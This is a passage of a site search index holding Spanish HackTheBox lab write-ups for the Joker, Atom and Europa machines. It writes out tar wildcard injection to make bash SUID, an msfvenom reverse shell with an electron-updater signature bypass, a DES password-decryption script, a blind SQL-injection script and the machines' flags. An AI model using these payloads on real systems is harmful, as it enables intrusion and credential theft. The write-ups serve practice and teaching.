de estos dos ultimos como parametros y en consecuencia ejecutara el comando asignado, otorgando el privilegio suid a la bash. alekos@joker:~/development$ touch -- --checkpoint=1alekos@joker:~/development$ touch -- '--checkpoint-action=exec=python abusing_wildcard. py'alekos@joker:~/development$ ls -ltotal 32-rw-rw-r-- 1 alekos alekos  0 Aug 26 04:05 --checkpoint-action=exec=python abusing_wildcard. py-rw-rw-r-- 1 alekos alekos  0 Aug 26 04:04 --checkpoint=1-rw-r----- 1 alekos alekos  0 May 18 2017 __init__. py-rw-rw-r-- 1 alekos alekos  44 Aug 26 04:07 abusing_wildcard. py-rw-r----- 1 alekos alekos 1452 May 18 2017 application. pydrwxrwx--- 2 alekos alekos 4096 May 18 2017 data-rw-r----- 1 alekos alekos 997 May 18 2017 models. pydrwxr-x--- 2 alekos alekos 4096 May 18 2017 staticdrwxr-x--- 2 alekos alekos 4096 May 18 2017 templates-rw-r----- 1 alekos alekos 2500 May 18 2017 utils. py-rw-r----- 1 alekos alekos 1748 May 18 2017 views. pyPasado unos minutos listamos la bash y vemos que se le dio el permiso correspondiente de manera exitosa. alekos@joker:~/development$ ls -l /bin/bash-rwsr-xr-x 1 root root 1041576 May 16 2017 /bin/bashFinalmente lo que nos quedaria por hacer es convertimos como el usuario root y leer la segunda flag root. txt. alekos@joker:~/development$ bash -pbash-4. 3# whoamirootbash-4. 3# cd /root/bash-4. 3# cat root. txt bash-4. 3# cat root. txt 90fcbcbbb01891eec43448b6b6d7051b"
    }, {
    "id": 16,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Atom",
    "title": "Maquina Atom - htb writeup",
    "body": "2023/08/10 - El dia de hoy vamos a resolver Atom de hackthebox una maquina windows de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves electron-builder donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de portablekanban y finalmente despues de una enumeración del servicio de redis obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario Administrator. Maquina curiosa asi que vamos a darle!. Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Atom❯ ls AtomSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 237PING 10. 10. 10. 237 (10. 10. 10. 237) 56(84) bytes of data. 64 bytes from 10. 10. 10. 237: icmp_seq=1 ttl=127 time=271 ms--- 10. 10. 10. 237 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 271. 205/271. 205/271. 205/0. 000 msVemos que la maquina nos responde, con un ttl de 63 y por proximidad seria correspondiente a una maquina linux. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 237 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-08-11 00:35 GMTInitiating SYN Stealth Scan at 00:35Scanning 10. 10. 10. 237 [65535 ports]Discovered open port 445/tcp on 10. 10. 10. 237Discovered open port 80/tcp on 10. 10. 10. 237Discovered open port 135/tcp on 10. 10. 10. 237Discovered open port 443/tcp on 10. 10. 10. 237Discovered open port 6379/tcp on 10. 10. 10. 237Discovered open port 5985/tcp on 10. 10. 10. 237Completed SYN Stealth Scan at 00:35, 26. 77s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 237Host is up, received user-set (0. 20s latency). Scanned at 2023-08-11 00:35:14 GMT for 27sNot shown: 65529 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE   REASON80/tcp  open http     syn-ack ttl 127135/tcp open msrpc    syn-ack ttl 127443/tcp open https    syn-ack ttl 127445/tcp open microsoft-ds syn-ack ttl 1275985/tcp open wsman    syn-ack ttl 1276379/tcp open redis    syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 89 seconds      Raw packets sent: 131081 (5. 768MB) | Rcvd: 23 (1. 012KB)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p80,135,443,445,5985,6379 10. 10. 10. 237 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-08-11 00:36 GMTNmap scan report for 10. 10. 10. 237Host is up (0. 21s latency). PORT   STATE SERVICE   VERSION80/tcp  open http     Apache httpd 2. 4. 46 ((Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27)|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27| http-methods: |_ Potentially risky methods: TRACE|_http-title: Heed Solutions135/tcp open msrpc    Microsoft Windows RPC443/tcp open ssl/http   Apache httpd 2. 4. 46 ((Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27)| tls-alpn: |_ http/1. 1|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_http-title: Heed Solutions| http-methods: |_ Potentially risky methods: TRACE|_ssl-date: TLS randomness does not represent time445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found6379/tcp open redis    Redis key-value storeService Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h20m00s, deviation: 4h02m32s, median: -1s| smb2-time: |  date: 2023-08-11T00:37:09|_ start_date: N/A| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: |  3. 1. 1: |_  Message signing enabled but not required| smb-os-discovery: |  OS: Windows 10 Pro 19042 (Windows 10 Pro 6. 3)|  OS CPE: cpe:/o:microsoft:windows_10::-|  Computer name: ATOM|  NetBIOS computer name: ATOM\x00|  Workgroup: WORKGROUP\x00|_ System time: 2023-08-10T17:37:13-07:00Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63. 19 secondsVisulizamos información interesante de los puertos escaneados:       Puerto   Servicio   Versión         80   HTTP   Apache httpd 2. 4. 46       135   MSRPC   Microsoft Windows RPC       443   HTTPS   Apache httpd 2. 4. 46       445   SMB   microsoft-ds Windows 10 Pro 19042       5985   WINRM   Microsoft HTTPAPI httpd 2. 0       6379   REDIS   Redis key-value store   EXPLOTACION #: Comenzamos usando whatweb, para determinar las tecnologias que esta usando el servicio web. ❯ whatweb 10. 10. 10. 237http://10. 10. 10. 237 [200 OK] Apache[2. 4. 46], Bootstrap, Country[RESERVED][ZZ], Email[MrR3boot@atom. htb], HTML5, HTTPServer[Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27], IP[10. 10. 10. 237], OpenSSL[1. 1. 1j], PHP[7. 3. 27], Script, Title[Heed Solutions]La herramienta no nos reporta que estamos ante un php, y si procedemos a abrir el servicio en el navegador vemos que pagina hace referencia a heed Solutions Ahora bien nmap nos reporto que el puerto 445 se encuentra abierto, asi que vamos a tratar de enumerar si existen recursos compartidos. Para ello usaremos smbmap de la suite de impacket. ❯ smbmap -H 10. 10. 10. 237 -u 'null'[+] Guest session  	IP: 10. 10. 10. 237:445	Name: 10. 10. 10. 237                   	Disk                         	Permissions	Comment	----                         	-----------	-------	ADMIN$                      	NO ACCESS	Remote Admin	C$                        	NO ACCESS	Default share	IPC$                       	READ ONLY	Remote IPC	Software_Updates                 	READ, WRITE	Vemos que tenemos permiso de lectura y ejecución en Software_Updates, asi que vamos a listar los recursos que contiene. ❯ smbmap -H 10. 10. 10. 237 -u 'null' -r 'Software_Updates'[+] Guest session  	IP: 10. 10. 10. 237:445	Name: 10. 10. 10. 237                   	Disk                         	Permissions	Comment	----                         	-----------	-------	Software_Updates                 	READ, WRITE		. \Software_Updates\*	dr--r--r--        0 Fri Aug 11 00:51:43 2023	. 	dr--r--r--        0 Fri Aug 11 00:51:43 2023	. . 	dr--r--r--        0 Fri Aug 11 00:48:27 2023	client1	dr--r--r--        0 Fri Aug 11 00:48:27 2023	client2	dr--r--r--        0 Fri Aug 11 00:48:27 2023	client3	fr--r--r--      35202 Fri Apr 9 11:18:08 2021	UAT_Testing_Procedures. pdfVamos a traernos a nuestra maquina y abrir el archivo pdf. ❯ smbmap -H 10. 10. 10. 237 -u 'null' --download 'Software_Updates/UAT_Testing_Procedures. pdf'[+] Starting download: Software_Updates\UAT_Testing_Procedures. pdf (35202 bytes)[+] File output to: /home/fmiracle/Machines/Aton/content/10. 10. 10. 237-Software_Updates_UAT_Testing_Procedures. pdf❯ ls 10. 10. 10. 237-Software_Updates_UAT_Testing_Procedures. pdf❯ mv 10. 10. 10. 237-Software_Updates_UAT_Testing_Procedures. pdf UAT_Testing_Procedures. pdf❯ ls UAT_Testing_Procedures. pdfSi lo queremos ver en nuestro navegador, yo voy a compartirme un servicio web con php, pero tu puedes hacerlo como mas te guste. ❯ php -S 0. 0. 0. 0:80[Fri Aug 11 00:56:38 2023] PHP 7. 4. 33 Development Server (http://0. 0. 0. 0:80) started Vemos que contiene información acerca de una aplicación en electron-builder Si bajamos un poco observamos qmas información donde nos dice que para iniciar el proceso QA debemos de poner las actualizaciones en uno de los directorios con el nombre client que curiosamente son los mismo cuando listamos los recursos compartidos con smbmap.  Electron - builder : Una solución completa para empaquetar y crear una aplicación Electron lista para su distribución para macOS, Windows y Linux con soporte de “actualización automática”. Si buscamos vulnerabilidades asociadas a electron builder, encontramos una de evasión de la validación de firmas que conduce a RCE en Electron-Updater. Basicamente esta vulnerabilidad se aprovecha de Electron-Updater y nos permite ejecutar codigo malicioso en el software. Te dejo el articulo para que puedas entenderlo mejor:  electron-updater-update-signature-bypass Para poder explotarla vamos a utilizar una estructura similar a la que nos comparten en el articulo y le pondremos la extensión yml. version: 1. 2. 3path: http://10. 10. 16. 2/testsha512: fjqwiofhqw21321 21ie21e2rEn la parte de path vamos a indicarle que al ejecutarse realize una petición a nuestra ip, donde nos pondremos en escucha con ncat. Y seguidamente vamos a subir en una de las carpetas client nuestro archivo yaml. ❯ smbclient //10. 10. 10. 237/Software_Updates -NTry  help  to get a list of possible commands. smb: \&gt; dir .                  D    0 Fri Aug 11 01:18:55 2023 . .                  D    0 Fri Aug 11 01:18:55 2023 client1               D    0 Fri Aug 11 01:18:55 2023 client2               D    0 Fri Aug 11 01:18:55 2023 client3               D    0 Fri Aug 11 01:18:55 2023 UAT_Testing_Procedures. pdf     A  35202 Fri Apr 9 11:18:08 2021		4413951 blocks of size 4096. 1369525 blocks availablesmb: \&gt; cd client1smb: \client1\&gt; put latest. ymlputting file latest. yml as \client1\latest. yml (0,1 kb/s) (average 0,1 kb/s)smb: \client1\&gt; dir .                  D    0 Fri Aug 11 01:21:33 2023 . .                  D    0 Fri Aug 11 01:21:33 2023 latest. yml             A    79 Fri Aug 11 01:21:33 2023		4413951 blocks of size 4096. 1369525 blocks availablesmb: \client1\&gt;Despues de unos segundos recibimos la conexión, lo cual nos garantiza que efectivamente estamos aprovechandonos de la vulnerabilidad. Lo que vamos a hacer ahora es crearnos un ejecutable malicioso con la ayuda de msfvenom para poder obtener una reverse shell de la maquina victima. ❯ msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 16. 2 LPORT=443 -f exe -o reverse. exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of exe file: 73802 bytesSaved as: reverse. exeUna cosa a recalcar que como nos dice el articulo el archivo debemos de llamarlo de una forma especial usando el simbolo ’ ❯ mv reverse. exe r’everse. exe❯ ls latest. yml  r’everse. exe  UAT_Testing_Procedures. pdfAdemas debemos de modificar nuestro archivo yml especificando en el path el archivo y no olvidemos incluir el sha512 del ejecutable. ❯ sha512sum r’everse. exed9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31 r’everse. exeEl archivo nos quedaria de la siguiente forma: version: 1. 2. 3path: r’everse. exe sha512: d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31Procedemos a subirlo en una de las carpetas client, compartimos el ejecutable desde nuestra maquina con python y nos ponemos en escucha en el puerto establecido con ncat. Recibimos la conexión como el usuario jason. nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 237. Connection from 10. 10. 10. 237:54130. Microsoft Windows [Version 10. 0. 19042. 906](c) Microsoft Corporation. All rights reserved. whoamiwhoamiatom\jasonAhora podemos dirigirnos a su directorio personal y leer la primera flag user. txt. cd C:\Users\jason\Desktopdirdir Volume in drive C has no label. Volume Serial Number is 9793-C2E6 Directory of C:\Users\jason\Desktop04/02/2021 10:29 PM  &lt;DIR&gt;     . 04/02/2021 10:29 PM  &lt;DIR&gt;     . . 03/31/2021 02:09 AM       2,353 heedv1. lnk03/31/2021 02:09 AM       2,353 heedv2. lnk03/31/2021 02:09 AM       2,353 heedv3. lnk08/10/2023 05:27 PM        34 user. txt        4 File(s)     7,093 bytes        2 Dir(s)  5,622,317,056 bytes freetype user. txttype user. txt5dcbc34fb2b0acaf6f9262acb7ec960eELEVACION DE PRIVILEGIOS #: Si enumeramos un poco el sistema, vemos en la carpeta Download un directorio referente a PortableKanban. cd Downloadsdirdir Volume in drive C has no label. Volume Serial Number is 9793-C2E6 Directory of C:\Users\jason\Downloads04/02/2021 08:00 AM  &lt;DIR&gt;     . 04/02/2021 08:00 AM  &lt;DIR&gt;     . . 03/31/2021 02:36 AM  &lt;DIR&gt;     node_modules04/02/2021 08:21 PM  &lt;DIR&gt;     PortableKanban        0 File(s)       0 bytes        4 Dir(s)  5,622,136,832 bytes freeC:\Users\jason\Downloads&gt;Si listamos el contenido obervamos varios archivos dll. cd PortableKanbandirdir Volume in drive C has no label. Volume Serial Number is 9793-C2E6 Directory of C:\Users\jason\Downloads\PortableKanban04/02/2021 08:21 PM  &lt;DIR&gt;     . 04/02/2021 08:21 PM  &lt;DIR&gt;     . . 02/27/2013 08:06 AM      58,368 CommandLine. dll11/08/2017 01:52 PM      141,312 CsvHelper. dll06/22/2016 09:31 PM      456,704 DotNetZip. dll04/02/2021 07:44 AM  &lt;DIR&gt;     Files11/23/2017 04:29 PM      23,040 Itenso. Rtf. Converter. Html. dll11/23/2017 04:29 PM      75,776 Itenso. Rtf. Interpreter. dll11/23/2017 04:29 PM      32,768 Itenso. Rtf. Parser. dll11/23/2017 04:29 PM      19,968 Itenso. Sys. dll11/23/2017 04:29 PM      376,832 MsgReader. dll07/03/2014 10:20 PM      133,296 Ookii. Dialogs. dll04/02/2021 07:17 AM  &lt;DIR&gt;     Plugins04/02/2021 08:22 PM       5,920 PortableKanban. cfg01/04/2018 09:12 PM      118,184 PortableKanban. Data. dll01/04/2018 09:12 PM     1,878,440 PortableKanban. exe01/04/2018 09:12 PM      31,144 PortableKanban. Extensions. dll04/02/2021 07:21 AM        172 PortableKanban. pk3. lock09/06/2017 12:18 PM      413,184 ServiceStack. Common. dll09/06/2017 12:17 PM      137,216 ServiceStack. Interfaces. dll09/06/2017 12:02 PM      292,352 ServiceStack. Redis. dll09/06/2017 04:38 AM      411,648 ServiceStack. Text. dll01/04/2018 09:14 PM     1,050,092 User Guide. pdf       19 File(s)   5,656,416 bytes        4 Dir(s)  5,625,991,168 bytes freeSi tratamos de buscar vulnerabilidades asociadas a PortableKanban, vemos un exploit con el podemos desencriptar una contraseña. ❯ searchsploit portablekanban------------------------------------------------------- --------------------------------- Exploit Title                     | Path------------------------------------------------------- ---------------------------------PortableKanban 4. 3. 6578. 38136 - Encrypted Password Ret | windows/local/49409. py------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsVimos anteriormente cuando listamos los archivos de portablekanban un archivo de configuración PortableKanban. cfg que si lo leemos encontramos una contraseña encryptada. type PortableKanban. cfg{ RoamingSettings :{ DataSource : RedisServer , DbServer : localhost , DbPort :6379, DbEncPassword : Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb , DbServer2 :  , DbPort2 :6379, DbEncPassword2 :  , DbIndex :0, DbSsl :false, DbTimeout :10, FlushChanges :true, UpdateInterval :5, AutoUpdate :true, Caption : My Tasks , RightClickAction : Nothing , DateTimeFormat : ddd, M/d/yyyy h:mm tt , BoardForeColor : WhiteSmoke , BoardBackColor : DimGray , ViewTabsFont : Segoe UI, 9pt , SelectedViewTabForeColor : WhiteSmoke , SelectedViewTabBackColor : Black , HeaderFont : Segoe UI, 11. 4pt , HeaderShowCount :true, HeaderShowLimit :true, HeaderShowEstimates :true, HeaderShowPoints :false, HeaderForeColor : WhiteSmoke , HeaderBackColor : Gray , CardFont : Segoe UI, 11. 4pt , CardLines :3, CardTextAlignment : Center , CardShowMarks :true, CardShowInitials :false, CardShowTags :true, ThickTags :false, DefaultTaskForeColor : WhiteSmoke , DefaultTaskBackColor : Gray , SelectedTaskForeColor : Recordemos que los archivos de configuración muchas veces contienen contraseñas ya sean encriptadas o en texto claro. Como ya contamos con una contraseña, ahora vamos a modificar un poco el exploit de tal manera que nos muestre la contraseña en texto claro. import jsonimport base64from des import * #python3 -m pip install desimport syshash = 'Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb'hash = base64. b64decode(hash. encode('utf-8'))key = DesKey(b 7ly6UznJ )print(key. decrypt(hash,initial=b XuVUm5fR ,padding=True). decode('utf-8'))Ejecutamos el exploit y obtenemos la contraseña en texto claro. ❯ python3 portable. pykidvscat_yes_kidvscatPodemos tratar de conectarnos como el usuario administrador con la contraseña obtenida, pero no resulta ser la correcta. Pero otro punto a recalcar es que en el archivo de configuración vemos algo de RedisServer, asi que podemos tratar de conectarnos al servicio de redis. ❯ redis-cli -h 10. 10. 10. 23710. 10. 10. 237:6379&gt; auth kidvscat_yes_kidvscatOKPara poder enumerar el servicio podemos apoyarnos de hacktricks, te dejo el recurso aqui:  https://book. hacktricks. xyz/network-services-pentesting/6379-pentesting-redisPodemos listar las KEYS disponibles y listar 10. 10. 10. 237:6379&gt; KEYS *1)  pk:ids:User 2)  pk:ids:MetaDataClass 3)  pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 4)  pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff 10. 10. 10. 237:6379&gt; GET pk:ids:User(error) WRONGTYPE Operation against a key holding the wrong kind of value10. 10. 10. 237:6379&gt; GET pk:ids:MetaDataClass(error) WRONGTYPE Operation against a key holding the wrong kind of value10. 10. 10. 237:6379&gt; GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 {\ Id\ :\ e8e29158d70d44b1a1ba4949d52790a0\ ,\ Name\ :\ Administrator\ ,\ Initials\ :\ \ ,\ Email\ :\ \ ,\ EncryptedPassword\ :\ Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\ ,\ Role\ :\ Admin\ ,\ Inactive\ :false,\ TimeStamp\ :637530169606440253} Obtenemos una contraseña enctryptada Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi con el mismo formato que la anterior que encontramos, asi que podemos usar el mismo exploit que previamente usamos para decencriptarla. import jsonimport base64from des import * #python3 -m pip install desimport syshash = 'Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'hash = base64. b64decode(hash. encode('utf-8'))key = DesKey(b 7ly6UznJ )print(key. decrypt(hash,initial=b XuVUm5fR ,padding=True). decode('utf-8'))Ejectamos nuevamente el exploit y obtenemos una nueva contraseña. ❯ python3 portable. pykidvscat_admin_@123Podemos a intentar con esta nueva conectarnos como el usuario Administrator usando winrm. ❯ evil-winrm -i 10. 10. 10. 237 -u 'Administrator' -p 'kidvscat_admin_@123'                    Evil-WinRM shell v3. 5                    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                    Data: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completion                    Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoamiatom\administratorNos conectamos satisfactoriamente y ahora podemos dirigirnos al directorio personal del usuario Administrator y visualizar la segunda flag root. txt. *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd C:\Users\Administrator\Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir  Directory: C:\Users\Administrator\DesktopMode         LastWriteTime     Length Name----         -------------     ------ -----ar---     8/10/2023  5:27 PM       34 root. txtEvil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root. txtf55c47e3b749e8ae956f980fba1dc782"
    }, {
    "id": 17,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Europa",
    "title": "Maquina Europa - htb writeup",
    "body": "2023/08/07 - El dia de hoy vamos a resolver Europa de hackthebox una maquina linux de dificultad media, en esta ocasión comprometeremos el sistema a traves de una inyección sql a un panel de login de un dominio expuesto en los CommonNames, ademas adicionalmente explotaremos una blind sql haciendo scripting en python. Una vez ya en el dashboard nos aprovecharemos de una vulnerabilidad de regex que nos permitira visualizar la primera flag del sistema y finalmente para convertirnos en el usuario root nos aprovecharemos de una tarea cron en la que manipularemos el permiso de la bash. Maquina curiosa asi que vamos a darle!. Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Europa❯ ls EuropaSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 22PING 10. 10. 10. 22 (10. 10. 10. 22) 56(84) bytes of data. 64 bytes from 10. 10. 10. 22: icmp_seq=1 ttl=63 time=132 ms--- 10. 10. 10. 22 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 131. 781/131. 781/131. 781/0. 000 msVemos que la maquina nos responde, con un ttl de 63 y por proximidad seria correspondiente a una maquina linux. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 22 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-08-07 01:20 GMTInitiating SYN Stealth Scan at 01:20Scanning 10. 10. 10. 22 [65535 ports]Discovered open port 22/tcp on 10. 10. 10. 22Discovered open port 443/tcp on 10. 10. 10. 22Discovered open port 80/tcp on 10. 10. 10. 22Completed SYN Stealth Scan at 01:20, 26. 93s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 22Host is up, received user-set (0. 15s latency). Scanned at 2023-08-07 01:20:05 GMT for 26sNot shown: 65532 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT  STATE SERVICE REASON22/tcp open ssh   syn-ack ttl 6380/tcp open http  syn-ack ttl 63443/tcp open https  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 27. 06 seconds      Raw packets sent: 131086 (5. 768MB) | Rcvd: 25 (1. 100KB)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p22,80,443 10. 10. 10. 22 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-08-07 01:22 GMTNmap scan report for 10. 10. 10. 22Host is up (0. 24s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 2 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)|  256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)|_ 256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)80/tcp open http   Apache httpd 2. 4. 18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2. 4. 18 (Ubuntu)443/tcp open ssl/http Apache httpd 2. 4. 18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2. 4. 18 (Ubuntu)| tls-alpn: |_ http/1. 1| ssl-cert: Subject: commonName=europacorp. htb/organizationName=EuropaCorp Ltd. /stateOrProvinceName=Attica/countryName=GR| Subject Alternative Name: DNS:www. europacorp. htb, DNS:admin-portal. europacorp. htb| Not valid before: 2017-04-19T09:06:22|_Not valid after: 2027-04-17T09:06:22|_ssl-date: TLS randomness does not represent timeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33. 12 secondsVisulizamos información interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 2       80   HTTP   Apache httpd 2. 4. 18       443   HTTPS   Apache httpd 2. 4. 18   EXPLOTACION #: Comenzamos usando whatweb, para determinar las tecnologias que esta usando el servicio web. ❯ whatweb http://10. 10. 10. 22http://10. 10. 10. 22 [200 OK] Apache[2. 4. 18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2. 4. 18 (Ubuntu)], IP[10. 10. 10. 22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]❯ whatweb https://10. 10. 10. 22https://10. 10. 10. 22 [200 OK] Apache[2. 4. 18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2. 4. 18 (Ubuntu)], IP[10. 10. 10. 22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]La herramienta no nos reporta mucha información, pero si vemos anteriormente nmap nos reporto CommonNames en el puerto 443, referentes a europacorp. htb. Asi que vamos a proceder a añadirlos a nuestro /etc/hosts. ❯ echo  10. 10. 10. 22 europacorp. htb admin-portal. europacorp. htb  &gt;&gt; /etc/hostsSi ahora vemos el servicio correspondiente al dominio admin-portal. europacorp. htb en el navegador, nos redirige a un panel de login.  Usaremos burpsuite para intentar manipular la petición e intentar colar una inyección.  Probamos a tratar de realizar una inyección sql, aplicando un order by basandonos en la quinta columna, obtenemos un codigo de estado 302.  Si aplicamos un follow redirect, vemos que nos logea al panel administrativo.  Podriamos seguir resolviendo la maquina, pero si ahora queremos realizar una enumeración de la base de datos para obtener mayor información podemos aprovecharnos de una de las columnas, y intentariamos obtener el nombre por ejemplo de la base de datos.  Pero vemos que no podemos ver el output de la inyección; por lo tanto ya que estamos a ciegas tendriamos que realizar una inyección basada en tiempo. Ojo esto es opcional, ya que podriamos continuar con el desarrollo de la máquina normalmente. Continuando para seguir con la explotación de la sql time based, vamos a mandar una query en especifico que sera la siguente, donde aplicaremos una condición que al ser el primer caracter del nombre de la base de datos una a la petición tardara 5 segundos.  Se valida la inyección correctamente asi que podemos tratar de automatizar el proceso montandonos un script en python y de esta manera obtendriamos la contraseña. #!/usr/bin/python3from pwn import *import stringimport urllib3import sys, pdb, signal, time, requestsdef def_handler(sig, frame):  print( \n[!] Saliendo. . . !\n )  sys. exit(1)#ctrl_csignal. signal(signal. SIGINT, def_handler)#globlal varsmain_url =  https://admin-portal. europacorp. htb/login. php characters = string. digits + 'abcdef'urllib3. disable_warnings()def makeRequest():  s = requests. session()  s. verify = False    p1 = log. progress( Fuerza Bruta )  p1. status( Iniciando proceso de Fuerza Bruta )  time. sleep(2)    p2 = log. progress( Database )  data =     for position in range(1, 50):    for character in characters:      post_data = {          'email': admin@europacorp. htb' and if(substr((select group_concat(password) from users),%d,1)='%s',sleep(3),1)-- -  % (position, character),          'password':'admin'      }      p1. status(post_data['email'])      time_start = time. time()      r = s. post(main_url, data=post_data)      time_end = time. time()      if time_end - time_start &gt; 3:        data += character        p2. status(data)        breakif __name__ == '__main__':  makeRequest()Obtenemos un contraseña hasheada la cual intentaremos crackear. 2b6d315337f18617ba18922c0b9597ffsi lo crackeamos online obtenemos la siguiente contraseña SuperSecretPassword!, la cual es valida para el usuario admin y nos permite igualmente poder logearnos al sistema. Una vez dentro del dashboard vemos la opción de Tools, donde podemos ver un generador de VPN que vamos a interceptar 